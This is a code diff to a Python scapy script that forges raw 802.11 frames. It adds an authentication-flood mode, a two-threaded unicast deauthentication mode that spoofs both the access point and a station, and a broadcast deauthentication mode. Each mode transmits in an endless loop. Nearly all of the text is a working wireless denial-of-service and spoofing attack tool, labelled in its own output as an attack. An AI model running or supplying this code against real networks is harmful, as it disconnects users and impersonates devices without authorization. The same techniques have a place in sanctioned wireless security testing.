@@ -4,17 +4,23 @@ from threading import Thread
 from scapy.all import sendp
 import sys
 
+
 argv=sys.argv
+
+if len(argv) <3:
+    print("%s <interface> <ap mac> [<station mac> [-auth]]" % argv[0])
+    exit(0)
+
 iface=argv[1]
 ap_mac=argv[2]
+auth_flag=False
 
-if "-auth" in argv:
-    auth_flag=True
-    if len(argv)==5:
-        station_mac=argv[4]
-else:
-    if len(argv)==4:
-        station_mac=argv[3]
+if len(argv)>3:
+    station_mac=argv[3]
+    station_mac=station_mac.replace(':','')
+    station_mac=bytes.fromhex(station_mac)
+    if "-auth" in argv:
+        auth_flag=True
 
 class RadioTopHeader():
     def __init__(self):
@@ -31,14 +37,15 @@ class RadioTopHeader():
         self.anthenna_signal2=b"\x00"
         self.anthenna=b"\x00"
 
-class DeauthFrame():
+class Frame():
     def __init__(self):
-        self.type=b"\xc0\x00"
+        self.type=b"\x00\x00"
         self.duration=b"\x00\x00"
         self.dst_addr=b"\x00"*6
         self.src_addr=b"\x00"*6
         self.bss=b"\x00"*6
         self.seq=b"\x00"*2
+
 
 class Packet():
     def __init__(self):
@@ -50,30 +57,84 @@ class Packet():
     def addRaw(self,raw_data):
         self.raw+=raw_data
 
-rt_header=RadioTopHeader()
-deauth_frame=DeauthFrame()
+def sendPacket(raw,iface):
+    sendp(raw,iface,loop=1,inter=0.02)
 
 ap_mac=ap_mac.replace(':','')
 ap_mac=bytes.fromhex(ap_mac)
-dst=b"\xff\xff\xff\xff\xff\xff"
+
+#auth attack
+if auth_flag:
+    print("[*] Auth Attack")
+
+    p=Packet()
+    rt_header=RadioTopHeader()
+    p.addFrame(rt_header)
+
+    auth_frame=Frame()
+    auth_frame.type=b"\xb0\x00"
+    auth_frame.dst_addr=ap_mac
+    auth_frame.src_addr=station_mac
+    auth_frame.bss=ap_mac
+    p.addFrame(auth_frame)
+
+    p.addRaw(b"\x00\x00\x01\x00\x00\x00") #wireless mgmt
+    sendPacket(p.raw,iface)
+
+#deauth attac - AP&Station unicast
+elif "station_mac" in locals():
+    print("[*] Deauth Attack - AP&Station Unicast")
+
+    p1=Packet()
+    rt_header=RadioTopHeader()
+    p1.addFrame(rt_header)
+
+    deauth_APunicast_frame=Frame()
+    deauth_APunicast_frame.type=b"\xc0\x00"
+    deauth_APunicast_frame.dst_addr=station_mac
+    deauth_APunicast_frame.src_addr=ap_mac
+    deauth_APunicast_frame.bss=ap_mac
+    p1.addFrame(deauth_APunicast_frame)
+    
+    p1.addRaw(b"\x06\x00") # wireless mgmt
+
+    p2=Packet()
+    p2.addFrame(rt_header)
+
+    deauth_STunicast_frame=Frame()
+    deauth_STunicast_frame.type=b"\xc0\x00"
+    deauth_STunicast_frame.dst_addr=ap_mac
+    deauth_STunicast_frame.src_addr=station_mac
+    deauth_STunicast_frame.bss=ap_mac
+    p2.addFrame(deauth_STunicast_frame)
+
+    p2.addRaw(b"\x01\x00\xdd\x08\x00\x17\x35\x01\x01\x00\x00\x00") # wireless mgmt
+
+    t1=Thread(target=sendPacket,args=(p1.raw,iface))
+    t2=Thread(target=sendPacket,args=(p2.raw,iface))
+
+    t1.start()
+    t2.start()
+
+    t1.join()
+    t2.join()
 
 
-if "station_mac" in locals():
-    station_mac=station_mac.replace(':','')
-    station_mac=bytes.fromhex(station_mac)
-    dst=station_mac
+#deauth attack - broadcast
+else:
+    print("[*] Deauth Attack - Broadcast")
+    p=Packet()
+    rt_header=RadioTopHeader()
+    p.addFrame(rt_header)
 
-rt_header.ch_frequency=b"\x9e\x09"
-deauth_frame.src_addr=ap_mac
-deauth_frame.dst_addr=dst
-deauth_frame.bss=ap_mac
+    deauth_frame=Frame()
+    deauth_frame.type=b"\xc0\x00"
+    deauth_frame.dst_addr=b"\xff\xff\xff\xff\xff\xff"
+    deauth_frame.src_addr=ap_mac
+    deauth_frame.bss=ap_mac
 
-p=Packet()
-p.addFrame(rt_header)
-p.addFrame(deauth_frame)
-p.addRaw(b"\x03\x00")
+    p.addFrame(deauth_frame)
+    p.addRaw(b"\x03\x00") #wireless mgmt
+    sendPacket(p.raw,iface)
 
 
-raw_packet=p.raw
-print(raw_packet)
-sendp(raw_packet,iface,loop=1,inter=0.01)
